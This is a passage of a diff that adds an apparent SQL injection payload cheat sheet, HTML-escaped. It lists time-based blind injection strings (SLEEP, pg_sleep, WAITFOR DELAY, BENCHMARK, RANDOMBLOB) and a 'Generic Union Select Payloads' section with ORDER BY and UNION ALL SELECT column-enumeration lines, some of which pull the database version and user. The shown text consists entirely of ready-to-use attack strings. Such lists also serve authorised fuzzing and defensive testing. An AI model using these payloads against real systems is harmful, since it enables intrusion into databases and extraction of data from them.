+&amp;quot;)) or pg_sleep(5)--
+&#39;)) or pg_sleep(5)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND &#39;vRxe&#39;=&#39;vRxe
+AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND &#39;%&#39;=&#39;
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
+SLEEP(5)#
+SLEEP(5)--
+SLEEP(5)=&amp;quot;
+SLEEP(5)=&#39;
+or SLEEP(5)
+or SLEEP(5)#
+or SLEEP(5)--
+or SLEEP(5)=&amp;quot;
+or SLEEP(5)=&#39;
+waitfor delay &#39;00:00:05&#39;
+waitfor delay &#39;00:00:05&#39;--
+waitfor delay &#39;00:00:05&#39;#
+benchmark(50000000,MD5(1))
+benchmark(50000000,MD5(1))--
+benchmark(50000000,MD5(1))#
+or benchmark(50000000,MD5(1))
+or benchmark(50000000,MD5(1))--
+or benchmark(50000000,MD5(1))#
+pg_SLEEP(5)
+pg_SLEEP(5)--
+pg_SLEEP(5)#
+or pg_SLEEP(5)
+or pg_SLEEP(5)--
+or pg_SLEEP(5)#
+&#39;\&amp;quot;
+AnD SLEEP(5)
+AnD SLEEP(5)--
+AnD SLEEP(5)#
+&amp;amp;&amp;amp;SLEEP(5)
+&amp;amp;&amp;amp;SLEEP(5)--
+&amp;amp;&amp;amp;SLEEP(5)#
+&#39; AnD SLEEP(5) ANd &#39;1
+&#39;&amp;amp;&amp;amp;SLEEP(5)&amp;amp;&amp;amp;&#39;1
+ORDER BY SLEEP(5)
+ORDER BY SLEEP(5)--
+ORDER BY SLEEP(5)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
++benchmark(3200,SHA1(1))+&#39;
++ SLEEP(10) + &#39;
+RANDOMBLOB(500000000/2)
+AND 2947=LIKE(&#39;ABCDEFG&#39;,UPPER(HEX(RANDOMBLOB(500000000/2))))
+OR 2947=LIKE(&#39;ABCDEFG&#39;,UPPER(HEX(RANDOMBLOB(500000000/2))))
+RANDOMBLOB(1000000000/2)
+AND 2947=LIKE(&#39;ABCDEFG&#39;,UPPER(HEX(RANDOMBLOB(1000000000/2))))
+OR 2947=LIKE(&#39;ABCDEFG&#39;,UPPER(HEX(RANDOMBLOB(1000000000/2))))
+SLEEP(1)/*&#39; or SLEEP(1) or &#39;&amp;quot; or SLEEP(1) or &amp;quot;*/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;generic-union-select-payloads&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#generic-union-select-payloads&#34;&gt;#&lt;/a&gt; Generic Union Select Payloads&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt; ORDER BY SLEEP(5)
+ ORDER BY 1,SLEEP(5)
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;))
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
+ ORDER BY SLEEP(5)#
+ ORDER BY 1,SLEEP(5)#
+ ORDER BY 1,SLEEP(5),3#
+ ORDER BY 1,SLEEP(5),3,4#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#
+ ORDER BY SLEEP(5)-- 
+ ORDER BY 1,SLEEP(5)-- 
+ ORDER BY 1,SLEEP(5),3-- 
+ ORDER BY 1,SLEEP(5),3,4-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- 
+ UNION ALL SELECT 1
+ UNION ALL SELECT 1,2
+ UNION ALL SELECT 1,2,3
+ UNION ALL SELECT 1,2,3,4
+ UNION ALL SELECT 1,2,3,4,5
+ UNION ALL SELECT 1,2,3,4,5,6
+ UNION ALL SELECT 1,2,3,4,5,6,7
+ UNION ALL SELECT 1,2,3,4,5,6,7,8
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
+ UNION ALL SELECT 1#
+ UNION ALL SELECT 1,2#
+ UNION ALL SELECT 1,2,3#
+ UNION ALL SELECT 1,2,3,4#
+ UNION ALL SELECT 1,2,3,4,5#
+ UNION ALL SELECT 1,2,3,4,5,6#
+ UNION ALL SELECT 1,2,3,4,5,6,7#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#
+ UNION ALL SELECT 1-- 
+ UNION ALL SELECT 1,2-- 
+ UNION ALL SELECT 1,2,3-- 
+ UNION ALL SELECT 1,2,3,4-- 
+ UNION ALL SELECT 1,2,3,4,5-- 
+ UNION ALL SELECT 1,2,3,4,5,6-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- 
+ UNION SELECT @@VERSION,SLEEP(5),3
+ UNION SELECT @@VERSION,SLEEP(5),USER(),4
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
+ UNION SELECT @@VERSION,SLEEP(5),&amp;quot;&#39;3
+ UNION SELECT @@VERSION,SLEEP(5),&amp;quot;&#39;3&#39;&amp;quot;#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),4#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13#
